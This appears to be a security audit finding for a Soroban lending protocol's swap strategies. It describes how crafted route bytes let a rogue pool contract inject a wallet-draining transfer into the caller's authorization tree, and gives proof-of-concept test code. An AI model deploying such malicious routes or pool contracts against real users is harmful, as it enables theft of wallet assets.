### Title
Attacker-controlled swap routes can inject unauthorized wallet transfers into a caller’s authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller strategy entrypoints accept opaque route bytes and forward them to the configured swap router without constraining the contracts invoked while the caller’s top-level authorization remains active. A crafted route can therefore add an unrelated token transfer to the transaction’s recorded authorization tree; if the account owner signs that simulated tree, the route can drain wallet assets outside the amount supplied to the lending operation.

### Finding Description
`swap_collateral` accepts caller-supplied `swap` bytes and passes them unchanged into `SwapCollateralParams`. [1](#0-0)  After authenticating the account owner or delegate, `process_swap_collateral` withdraws the selected collateral and routes it through `withdraw_and_swap_from_supply`. [2](#0-1)  That helper forwards the measured withdrawal and the unmodified route to `swap_tokens_or_passthrough`. [3](#0-2) 

The swap helper authorizes only the intended controller-to-router input transfer, but then invokes `execute_strategy` with the opaque route under the ongoing caller-authorized operation. [4](#0-3)  Its post-call validation checks only the controller’s input balance and the requested output token delta; it does not detect unrelated token transfers from the caller. [5](#0-4) 

This is the on-chain analogue of injecting an extra parameter into a trusted validation request: the route parameter can inject arbitrary third-party code into the authorization context. The project’s own threat model confirms that routed calls are not venue-allowlisted and that a route-selected contract can add a caller token transfer as a child of the caller’s authorization entry. [6](#0-5) 

### Impact Explanation
A malicious route can steal arbitrary assets held in the caller’s wallet, including assets unrelated to the lending operation and assets never supplied to the protocol. The controller’s exact-input authorization, measured output check, slippage floor, and final risk validation do not bound this loss because the malicious transfer uses a separate token and destination recorded as a child authorization. [6](#0-5) 

### Likelihood Explanation
Exploitation requires the victim to submit a malicious route and sign the authorization tree containing the injected transfer. This is plausible where route bytes or prepared transactions are obtained from a quote service, frontend, bot, or other route producer and the wallet does not clearly display every nested authorization. The affected caller-controlled paths include `swap_collateral`, `repay_debt_with_collateral`, `swap_debt`, `multiply`, and `convert_swap`; `swap_collateral` provides a direct route-controlled path while operating on existing collateral. [7](#0-6) 

### Recommendation
Constrain swap execution so route-selected contracts cannot obtain additional caller authorization. Prefer having the router execute under an isolated intermediary authorization model, or modify the router/protocol boundary so only the exact input transfer may be a child of the caller’s authorization and no route-invoked contract can add another caller-funded transfer. At minimum, require clients to simulate the complete transaction, decode the route, and reject any authorization tree containing children other than the expected input transfer; this mitigation should be enforced by the integration rather than left as documentation. [6](#0-5) 

### Proof of Concept
The test harness builds a route whose `hop_pool` is an attacker-controlled contract and submits it through Alice’s `swap_collateral` call. [8](#0-7)  The rogue pool issues `token.transfer(alice, attacker, WALLET_BALANCE)` for an unrelated wallet token. [9](#0-8)  Simulation records that transfer as a child of Alice’s `swap_collateral` authorization, and after execution Alice’s unrelated token balance is zero while the attacker receives it. [10](#0-9)  In enforcing mode, the same rogue transfer succeeds once the poisoned tree containing that child is signed. [11](#0-10)

### Citations

**File:** contracts/controller/src/lib.rs (L225-301)
```rust
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
    ) -> u64 {
        strategies::multiply::process_multiply(
            &env,
            &caller,
            MultiplyParams {
                account_id,
                spoke_id,
                collateral: &collateral,
                debt_to_flash_loan,
                debt: &debt,
                mode,
                swap: &swap,
                initial_payment,
                convert_swap,
            },
        )
    }

    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/legs.rs (L231-258)
```rust
/// Withdraws to the controller, then swaps its measured receipt into `token_out`.
/// Matching assets pass through unchanged; returns the available output.
pub(crate) fn withdraw_and_swap_from_supply(
    env: &Env,
    account: &mut Account,
    cache: &mut Context,
    caller: &Address,
    from: &HubAssetKey,
    amount: i128,
    token_out: &Address,
    swap: &StrategySwap,
    action: events::PositionAction,
) -> i128 {
    let supply_pos = get_supply_position_or_panic(env, account, from);

    let actual_withdrawn = withdraw_collateral_to_controller(
        env,
        account,
        cache,
        StrategyWithdraw {
            hub_asset: from,
            amount,
            position: &supply_pos,
            action,
        },
    );

    swap_tokens_or_passthrough(env, caller, &from.asset, actual_withdrawn, token_out, swap)
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-157)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }

    fn assets(&self) -> (HubAssetKey, HubAssetKey) {
        (
            hub_asset(self.t.resolve_asset("USDC")),
            hub_asset(self.t.resolve_asset("ETH")),
        )
    }

    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
